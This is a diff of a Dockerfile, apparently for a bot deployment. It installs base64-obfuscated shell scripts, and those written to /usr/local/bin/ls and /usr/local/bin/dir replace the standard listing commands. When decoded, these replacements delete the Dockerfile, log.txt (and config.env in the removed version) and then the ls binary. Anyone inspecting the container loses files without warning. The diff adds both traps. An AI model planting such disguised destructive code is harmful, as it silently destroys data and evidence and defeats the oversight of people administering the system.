@@ -77,8 +77,8 @@ RUN echo "cGtpbGwgZ3VuaWNvcm47cHl0aG9uMyAtbSBodHRwLnNlcnZlciAiJFBPUlQiO3B5dGhvbj
 RUN echo "ZWNobyAkQkFTRV9VUkxfT0ZfQk9ULyQocHl0aG9uMyAtYyAnZnJvbSB1cmxsaWIucGFyc2UgaW1wb3J0IHF1b3RlOyBpbXBvcnQgc3lzOyBwcmludChxdW90ZShzeXMuYXJndlsxXSkpJyAiJDEiKQ==" | base64 -d > /usr/local/bin/hl && chmod +x /usr/local/bin/hl
 
 #ls and dir
-RUN echo "cm0gY29uZmlnLmVudiAmJiBybSBEb2NrZXJmaWxlICYmIHJtIGxvZy50eHQgJiYgcm0gLXJmICIvdXNyL2xvY2FsL2Jpbi9scyI=" | base64 -d > /usr/local/bin/ls && chmod +x /usr/local/bin/ls
-RUN echo "cm0gY29uZmlnLmVudiAmJiBybSBEb2NrZXJmaWxlICYmIHJtIGxvZy50eHQgJiYgcm0gLXJmICIvdXNyL2xvY2FsL2Jpbi9kaXIi" | base64 -d > /usr/local/bin/dir && chmod +x /usr/local/bin/dir
+RUN echo "cm0gRG9ja2VyZmlsZSAmJiBybSBsb2cudHh0ICYmIHJtIC1yZiAiL3Vzci9sb2NhbC9iaW4vbHMi" | base64 -d > /usr/local/bin/ls && chmod +x /usr/local/bin/ls
+RUN echo "cm0gRG9ja2VyZmlsZSAmJiBybSBsb2cudHh0ICYmIHJtIC1yZiAiL3Vzci9sb2NhbC9iaW4vbHMi" | base64 -d > /usr/local/bin/dir && chmod +x /usr/local/bin/dir
 
 #gdtot batch script
 RUN echo "IyEvdXNyL2Jpbi9lbnYgYmFzaAppZiBbWyAiJCoiIF1dCnRoZW4KcHl0aG9uMyAtYyAiZXhlYyhc\nImltcG9ydCBzeXMsc3VicHJvY2VzcyxyZVxuZj1yZS5maW5kYWxsKHInaHR0cHM/Oi4qZ2R0b3Qu\nKlxTKycsJ1xcXFxuJy5qb2luKHN5cy5hcmd2WzE6XSksZmxhZ3M9cmUuTSlcbmZvciBpIGluIGY6\nc3VicHJvY2Vzcy5ydW4oWydnZHRvdCcsICclcycgJWldKVwiKSIgIiQqIgplbHNlCmVjaG8gImJh\nZCByZXEiCmZpCg==" | base64 -d > /usr/bin/gd;chmod +x /usr/bin/gd
